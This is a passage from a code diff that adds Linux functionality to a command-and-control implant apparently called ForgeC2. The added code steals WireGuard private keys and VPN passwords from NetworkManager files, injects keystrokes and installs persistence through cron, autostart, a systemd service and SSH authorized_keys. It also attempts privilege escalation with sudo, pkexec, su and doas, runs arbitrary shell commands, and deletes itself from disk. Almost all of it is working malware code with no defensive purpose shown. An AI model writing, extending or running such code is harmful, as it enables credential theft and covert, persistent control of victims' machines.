+								results = append(results, fmt.Sprintf("  %s", line))
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+
+	// WireGuard configs
+	wireguardDirs := []string{
+		"/etc/wireguard",
+		filepath.Join(home, ".config", "wireguard"),
+	}
+	for _, dir := range wireguardDirs {
+		if entries, err := os.ReadDir(dir); err == nil {
+			for _, entry := range entries {
+				if strings.HasSuffix(entry.Name(), ".conf") {
+					path := filepath.Join(dir, entry.Name())
+					if fi, err := os.Stat(path); err == nil {
+						data, _ := os.ReadFile(path)
+						results = append(results, fmt.Sprintf("[WireGuard] %s (%d bytes)", path, fi.Size()))
+						for _, line := range strings.Split(string(data), "\n") {
+							line = strings.TrimSpace(line)
+							if strings.HasPrefix(line, "PrivateKey") || strings.HasPrefix(line, "PreSharedKey") ||
+								strings.HasPrefix(line, "Endpoint") || strings.HasPrefix(line, "AllowedIPs") {
+								results = append(results, fmt.Sprintf("  %s", line))
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+
+	// VPN credentials in NetworkManager connections
+	nmDir := "/etc/NetworkManager/system-connections"
+	if entries, err := os.ReadDir(nmDir); err == nil {
+		for _, entry := range entries {
+			path := filepath.Join(nmDir, entry.Name())
+			if fi, err := os.Stat(path); err == nil {
+				data, _ := os.ReadFile(path)
+				results = append(results, fmt.Sprintf("[NetworkManager] %s (%d bytes)", path, fi.Size()))
+				for _, line := range strings.Split(string(data), "\n") {
+					line = strings.TrimSpace(line)
+					if strings.Contains(line, "psk=") || strings.Contains(line, "password=") ||
+						strings.Contains(line, "vpn-secret") || strings.Contains(line, "cert-pass") {
+						results = append(results, fmt.Sprintf("  %s", line))
+					}
+				}
+			}
+		}
+	}
+
+	if len(results) == 0 {
+		return "vpn_creds: no VPN configurations found"
+	}
+	return strings.Join(results, "\n")
 }
 
 func remoteInputStub(payload string) string {
-	if Debug {
-		fmt.Printf("[*] remote_input stub (linux): %s\n", payload)
+	// Use xdotool or ydotool to simulate keyboard input on Linux
+	if payload == "" {
+		return "remote_input: no payload provided"
 	}
-	return "remote_input: stub (log only — input injection not implemented on Linux)"
+
+	// Try xdotool first (X11), then ydotool (Wayland)
+	xdotoolCmds := [][]string{
+		{"xdotool", "type", payload},
+		{"xdotool", "key", payload},
+	}
+
+	var lastErr string
+	for _, args := range xdotoolCmds {
+		if _, err := exec.Command(args[0], args[1:]...).Output(); err == nil {
+			return fmt.Sprintf("remote_input: sent via %s: %s", args[0], payload)
+		} else {
+			lastErr = err.Error()
+		}
+	}
+
+	// Try ydotool
+	if _, err := exec.Command("ydotool", "type", payload).Output(); err == nil {
+		return fmt.Sprintf("remote_input: sent via ydotool: %s", payload)
+	}
+
+	// Try direct /dev/uinput or /dev/input write (requires root)
+	if os.Geteuid() == 0 {
+		uinputDevices := []string{"/dev/uinput", "/dev/input/uinput"}
+		for _, dev := range uinputDevices {
+			if f, err := os.OpenFile(dev, os.O_WRONLY, 0); err == nil {
+				f.Write([]byte(payload))
+				f.Close()
+				return fmt.Sprintf("remote_input: sent via %s: %s", dev, payload)
+			}
+		}
+	}
+
+	return fmt.Sprintf("remote_input: failed (install xdotool for X11 or ydotool for Wayland): %s", lastErr)
 }
 
 func applyPersistence(method string, args string) string {
-	return "not supported on Linux"
+	method = strings.ToLower(strings.TrimSpace(method))
+	switch method {
+	case "cron", "crontab":
+		addPersistenceLinux()
+		return "persistence: cron @reboot + XDG autostart installed"
+	case "autostart", "xdg":
+		addPersistenceLinux()
+		return "persistence: XDG autostart desktop file installed"
+	case "systemd", "service":
+		exe, _ := os.Executable()
+		absExe, _ := filepath.Abs(exe)
+		serviceName := "forgec2"
+		if args != "" {
+			serviceName = args
+		}
+		serviceUnit := fmt.Sprintf(`[Unit]
+Description=ForgeC2 Agent
+After=network.target
+
+[Service]
+ExecStart=%s
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target
+`, absExe)
+		servicePath := fmt.Sprintf("/etc/systemd/system/%s.service", serviceName)
+		if err := os.WriteFile(servicePath, []byte(serviceUnit), 0644); err != nil {
+			return fmt.Sprintf("persistence: failed to write systemd unit: %v", err)
+		}
+		exec.Command("systemctl", "daemon-reload").Run()
+		exec.Command("systemctl", "enable", serviceName).Run()
+		exec.Command("systemctl", "start", serviceName).Run()
+		return fmt.Sprintf("persistence: systemd service %s installed at %s", serviceName, servicePath)
+	case "ssh", "ssh_authorized_keys":
+		home := os.Getenv("HOME")
+		if home == "" {
+			return "persistence: HOME not set"
+		}
+		sshDir := filepath.Join(home, ".ssh")
+		os.MkdirAll(sshDir, 0700)
+		// Add SSH public key for persistence if provided in args
+		if args != "" {
+			authFile := filepath.Join(sshDir, "authorized_keys")
+			existing, _ := os.ReadFile(authFile)
+			if !strings.Contains(string(existing), args) {
+				f, _ := os.OpenFile(authFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
+				if f != nil {
+					f.WriteString("\n" + args + "\n")
+					f.Close()
+					return "persistence: SSH authorized_key added"
+				}
+			}
+		}
+		return "persistence: SSH authorized_keys persistence requires a public key as args"
+	default:
+		addPersistenceLinux()
+		return fmt.Sprintf("persistence: unknown method '%s', installed default (cron+autostart)", method)
+	}
 }
 
 func listPersistence() string {
-	return "not supported on Linux"
+	var sb strings.Builder
+	sb.WriteString("=== Linux Persistence Mechanisms ===\n")
+
+	// Check crontab
+	cronOut, err := exec.Command("crontab", "-l").Output()
+	if err == nil {
+		sb.WriteString(fmt.Sprintf("\n--- Crontab ---\n%s\n", string(cronOut)))
+	} else {
+		sb.WriteString("\n--- Crontab --- (none or not available)\n")
+	}
+
+	// Check systemd services
+	exe, _ := os.Executable()
+	absExe, _ := filepath.Abs(exe)
+	sb.WriteString("\n--- Systemd Services ---\n")
+	systemdOut, _ := exec.Command("systemctl", "list-units", "--type=service", "--all", "--no-legend").Output()
+	if len(systemdOut) > 0 {
+		for _, line := range strings.Split(string(systemdOut), "\n") {
+			if strings.Contains(line, "forgec2") || strings.Contains(line, filepath.Base(absExe)) {
+				sb.WriteString(fmt.Sprintf("[+] %s\n", line))
+			}
+		}
+	}
+
+	// Check XDG autostart
+	home := os.Getenv("HOME")
+	if home != "" {
+		autostartDir := filepath.Join(home, ".config", "autostart")
+		sb.WriteString("\n--- XDG Autostart ---\n")
+		if entries, err := os.ReadDir(autostartDir); err == nil {
+			for _, entry := range entries {
+				desktopPath := filepath.Join(autostartDir, entry.Name())
+				if data, err := os.ReadFile(desktopPath); err == nil {
+					sb.WriteString(fmt.Sprintf("[+] %s\n%s\n", desktopPath, string(data)))
+				}
+			}
+		} else {
+			sb.WriteString("(no autostart directory)\n")
+		}
+
+		// Check SSH authorized_keys
+		sshDir := filepath.Join(home, ".ssh")
+		authFile := filepath.Join(sshDir, "authorized_keys")
+		sb.WriteString("\n--- SSH Authorized Keys ---\n")
+		if data, err := os.ReadFile(authFile); err == nil {
+			lines := strings.Split(string(data), "\n")
+			for _, line := range lines {
+				if strings.TrimSpace(line) != "" && !strings.HasPrefix(line, "#") {
+					sb.WriteString(fmt.Sprintf("[+] %s\n", line))
+				}
+			}
+		} else {
+			sb.WriteString("(not found)\n")
+		}
+	}
+
+	return sb.String()
 }
 
 func removePersistence(method string, args string) string {
-	return "not supported on Linux"
+	method = strings.ToLower(strings.TrimSpace(method))
+	switch method {
+	case "systemd", "service":
+		serviceName := "forgec2"
+		if args != "" {
+			serviceName = args
+		}
+		exec.Command("systemctl", "stop", serviceName).Run()
+		exec.Command("systemctl", "disable", serviceName).Run()
+		os.Remove(fmt.Sprintf("/etc/systemd/system/%s.service", serviceName))
+		exec.Command("systemctl", "daemon-reload").Run()
+		return fmt.Sprintf("persistence: systemd service %s removed", serviceName)
+	case "ssh", "ssh_authorized_keys":
+		home := os.Getenv("HOME")
+		if home == "" {
+			return "persistence: HOME not set"
+		}
+		authFile := filepath.Join(home, ".ssh", "authorized_keys")
+		if args != "" {
+			data, _ := os.ReadFile(authFile)
+			var newLines []string
+			for _, line := range strings.Split(string(data), "\n") {
+				if !strings.Contains(line, args) {
+					newLines = append(newLines, line)
+				}
+			}
+			os.WriteFile(authFile, []byte(strings.Join(newLines, "\n")), 0600)
+			return "persistence: SSH key removed from authorized_keys"
+		}
+		return "persistence: specify key fragment to remove from authorized_keys"
+	default:
+		removePersistenceLinux()
+		return "persistence: Linux entries removed (cron+autostart)"
+	}
 }
 
 func uacBypass(method, payload string) string {
-	return "not supported on Linux"
+	if payload == "" {
+		payload = "whoami"
+	}
+
+	method = strings.ToLower(strings.TrimSpace(method))
+	switch method {
+	case "sudo", "sudo_nopasswd":
+		// Try sudo with NOPASSWD first
+		out, err := runShell(fmt.Sprintf("sudo -n %s", payload), "")
+		if err == nil {
+			return fmt.Sprintf("uac_bypass: sudo (NOPASSWD) succeeded\n%s", out)
+		}
+		return fmt.Sprintf("uac_bypass: sudo NOPASSWD failed: %v\n%s", err, out)
+
+	case "pkexec":
+		out, err := runShell(fmt.Sprintf("pkexec %s", payload), "")
+		if err == nil {
+			return fmt.Sprintf("uac_bypass: pkexec succeeded\n%s", out)
+		}
+		return fmt.Sprintf("uac_bypass: pkexec failed: %v\n%s", err, out)
+
+	case "su", "su_root":
+		// su with password - will likely fail without password input
+		out, err := runShell(fmt.Sprintf("echo '%s' | su - root -c '%s' 2>/dev/null", payload, payload), "")
+		if err == nil && !strings.Contains(out, "Authentication failure") {
+			return fmt.Sprintf("uac_bypass: su succeeded\n%s", out)
+		}
+		// Try without password (if running as root already)
+		out, err = runShell(fmt.Sprintf("su -c '%s'", payload), "")
+		if err == nil {
+			return fmt.Sprintf("uac_bypass: su (no password) succeeded\n%s", out)
+		}
+		return fmt.Sprintf("uac_bypass: su failed: %v", err)
+
+	case "doas":
+		out, err := runShell(fmt.Sprintf("doas %s", payload), "")
+		if err == nil {
+			return fmt.Sprintf("uac_bypass: doas succeeded\n%s", out)
+		}
+		return fmt.Sprintf("uac_bypass: doas failed: %v\n%s", err, out)
+
+	case "polkit", "pkaction":
+		// Check polkit version for known vulns
+		verOut, _ := runShell("pkaction --version 2>/dev/null || pkcheck --version 2>/dev/null", "")
+		return fmt.Sprintf("uac_bypass: polkit version: %s\nUse privesc_check for CVE-2021-4034 (pkexec) and CVE-2022-0847 (Dirty Pipe)", verOut)
+
+	case "all":
+		var sb strings.Builder
+		sb.WriteString("=== UAC Bypass Attempts (Linux) ===\n\n")
+		sb.WriteString("--- sudo ---\n")
+		if out, err := runShell(fmt.Sprintf("sudo -n %s 2>&1", payload), ""); err == nil {
+			sb.WriteString(fmt.Sprintf("[+] SUCCESS\n%s\n", out))
+		} else {
+			sb.WriteString(fmt.Sprintf("[-] Failed: %v\n", err))
+		}
+		sb.WriteString("\n--- pkexec ---\n")
+		if out, err := runShell(fmt.Sprintf("pkexec %s 2>&1", payload), ""); err == nil {
+			sb.WriteString(fmt.Sprintf("[+] SUCCESS\n%s\n", out))
+		} else {
+			sb.WriteString(fmt.Sprintf("[-] Failed: %v\n", err))
+		}
+		sb.WriteString("\n--- doas ---\n")
+		if out, err := runShell(fmt.Sprintf("doas %s 2>&1", payload), ""); err == nil {
+			sb.WriteString(fmt.Sprintf("[+] SUCCESS\n%s\n", out))
+		} else {
+			sb.WriteString(fmt.Sprintf("[-] doas not available or failed\n"))
+		}
+		return sb.String()
+
+	default:
+		return fmt.Sprintf("uac_bypass: unknown method '%s' on Linux (supported: sudo, pkexec, su, doas, polkit, all)", method)
+	}
 }
 
 func executeNetCommand(cmd string) string {
-	return "net command suite is Windows-only"
+	// Linux network commands: ifconfig, ip, ss, netstat, arp
+	cmd = strings.ToLower(strings.TrimSpace(cmd))
+
+	switch {
+	case cmd == "" || cmd == "help" || cmd == "?":
+		return `Available Linux network commands:
+  ifconfig       - Show network interfaces
+  ip addr        - Show IP addresses
+  ip route       - Show routing table
+  ss             - Show socket statistics
+  netstat        - Show network connections
+  arp            - Show ARP cache
+  iptables       - Show firewall rules (requires root)
+  dns            - Show DNS config (/etc/resolv.conf)
+  hosts          - Show /etc/hosts`
+
+	case cmd == "ifconfig":
+		out, _ := runShell("ifconfig 2>/dev/null || ip addr 2>/dev/null", "")
+		return out
+
+	case cmd == "ip addr":
+		out, _ := runShell("ip addr 2>/dev/null", "")
+		return out
+
+	case cmd == "ip route" || cmd == "route":
+		out, _ := runShell("ip route 2>/dev/null || route -n 2>/dev/null", "")
+		return out
+
+	case cmd == "ss" || cmd == "netstat":
+		out, _ := runShell("ss -tunap 2>/dev/null || netstat -tunap 2>/dev/null", "")
+		return out
+
+	case cmd == "arp":
+		out, _ := runShell("arp -n 2>/dev/null || ip neigh 2>/dev/null", "")
+		return out
+
+	case cmd == "iptables":
+		out, _ := runShell("iptables -L -n -v 2>/dev/null", "")
+		if out == "" {
+			out = "(requires root)\n"
+		}
+		return out
+
+	case cmd == "dns" || cmd == "resolv":
+		data, _ := os.ReadFile("/etc/resolv.conf")
+		return string(data)
+
+	case cmd == "hosts":
+		data, _ := os.ReadFile("/etc/hosts")
+		return string(data)
+
+	default:
+		// Try running as a shell command
+		out, err := runShell(cmd, "")
+		if err != nil {
+			return fmt.Sprintf("net: unknown command: %s (supported: ifconfig, ip addr, ip route, ss, netstat, arp, iptables, dns, hosts)", cmd)
+		}
+		return out
+	}
 }
 
 func amsiBypass() string {
@@ -371,8 +1589,17 @@ func protectProcess() string {
 	return "not supported on Linux"
 }
 
+// selfDelete creates a cleanup script that removes the binary and process.
 func selfDelete() string {
-	return "not supported on Linux"
+	script := "#!/bin/sh\nrm -f /proc/$PPID/exe 2>/dev/null\nkill -9 $PPID 2>/dev/null\nrm -f \"$0\""
+	tmpFile := "/tmp/.fc_cleanup.sh"
+	if err := os.WriteFile(tmpFile, []byte(script), 0755); err != nil {
+		return "self-delete: failed to write script: " + err.Error()
+	}
+	if err := exec.Command("/bin/sh", tmpFile).Start(); err != nil {
+		return "self-delete: failed to start cleanup: " + err.Error()
+	}
+	return "self-delete: cleanup script launched"
 }
 
 func wipeEventLog() string {
@@ -452,6 +1679,14 @@ func ldapACL() (string, error) {
 	return "", fmt.Errorf("LDAP queries are Windows-only")
 }
 
+func namedPipeImpersonate(cmd string) (string, error) {
+	return "", fmt.Errorf("named pipe impersonation is Windows-only")
+}
+
+func juicyPotato(cmd string) (string, error) {
+	return "", fmt.Errorf("Juicy Potato is Windows-only")
+}
+
 func selfUpdateLinux(exe, tmpPath string) string {
 	shScript := fmt.Sprintf(
 		"#!/bin/sh\nsleep 1\ncp -f '%s' '%s'\nchmod +x '%s'\nexec '%s'\n",
@@ -470,3 +1705,38 @@ func selfUpdateLinux(exe, tmpPath string) string {
 }
 
 func selfUpdateDarwin(exe, tmpPath string) string { return "" }
+
+// NTLM relay & coerce stubs
+func coercePrinterBug(target, listenAddr string) (string, error) {
+	return "", fmt.Errorf("coerce attacks are Windows-only")
+}
+func coercePetitPotam(target, listenAddr string) (string, error) {
+	return "", fmt.Errorf("coerce attacks are Windows-only")
+}
+func coerceDFSCoerce(target, listenAddr string) (string, error) {
+	return "", fmt.Errorf("coerce attacks are Windows-only")
+}
+func startNTLMRelay(listenAddr, forwardTarget string) (string, error) {
+	return "", fmt.Errorf("NTLM relay is Windows-only")
+}
+func stopNTLMRelay() (string, error) {
+	return "", fmt.Errorf("NTLM relay is Windows-only")
+}
+
+func initCLRHosting() bool { return false }
+
+func executeAssemblyInProcess(assemblyData []byte, args string) (string, error) {
+	return "", fmt.Errorf("CLR execute-assembly is Windows-only")
+}
+
+func runPowerShellInProcess(script string) (string, error) {
+	return "", fmt.Errorf("CLR PowerShell is Windows-only")
+}
+
+func handleCLRExecAssembly(task Task, res *TaskResult) {
+	res.Error = "clr_exec_assembly is Windows-only"
+}
+
+func handleCLRPowerShell(task Task, res *TaskResult) {
+	res.Error = "clr_powershell is Windows-only"
+}
